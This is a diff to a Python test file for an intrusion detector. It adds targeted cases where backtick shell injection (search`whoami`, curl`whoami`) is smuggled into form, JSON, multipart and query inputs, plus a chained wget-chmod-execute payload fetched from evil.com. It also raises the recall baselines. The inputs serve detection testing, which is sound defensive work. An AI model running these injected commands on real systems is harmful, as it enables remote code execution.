@@ -521,6 +521,33 @@ _TARGETED_CASES: list[TargetedCase] = [
 ]
 
 
+_BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
+    TargetedCase(
+        "defect5_form_body_keyword_after_glued_shell_command",
+        _form_body_request("search`whoami` LIMIT 10"),
+        True,
+    ),
+    TargetedCase(
+        "defect5_json_body_keyword_before_glued_shell_command",
+        _json_body_request("SELECT note; search`whoami`"),
+        True,
+    ),
+    TargetedCase(
+        "defect5_multipart_body_bare_chained_download_and_execute",
+        _multipart_body_request(
+            "set your profile bio to: "
+            "`wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`"
+        ),
+        True,
+    ),
+    TargetedCase(
+        "defect5_query_param_prefix_command_word",
+        _query_param_request("curl`whoami` data on file"),
+        True,
+    ),
+]
+
+
 def _mechanism_for_index(mechanisms: tuple[str, ...], index: int) -> str:
     return mechanisms[index % len(mechanisms)]
 
@@ -566,8 +593,8 @@ _KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
     ),
 }
 
-BASELINE_MALICIOUS_DETECTED_TOTAL = 177
-_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL = 163
+BASELINE_MALICIOUS_DETECTED_TOTAL = 184
+_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL = 184
 _WALL_TIME_CEILING_SECONDS = 45.0
 
 
@@ -627,6 +654,12 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
         if result.is_threat != targeted.expect_detected:
             targeted_failures.append(targeted.case_id)
 
+    backtick_targeted_failures: list[str] = []
+    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
+        result = detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            backtick_targeted_failures.append(targeted.case_id)
+
     wall_time_seconds = time.monotonic() - start
 
     report_lines = [
@@ -665,6 +698,14 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
             f"gap={targeted.known_gap_reason or 'none'}"
         )
     report_lines.append("")
+    report_lines.append(
+        "targeted backtick sql-keyword-exemption-bypass cases (defect 5):"
+    )
+    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
     report_lines.append("known end-to-end false positives (documented, still counted):")
     for case_id, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
         report_lines.append(f"  {case_id}: {reason}")
@@ -672,6 +713,7 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
     print(report)
 
     assert not targeted_failures, f"{targeted_failures}\n{report}"
+    assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
 
     assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
         f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
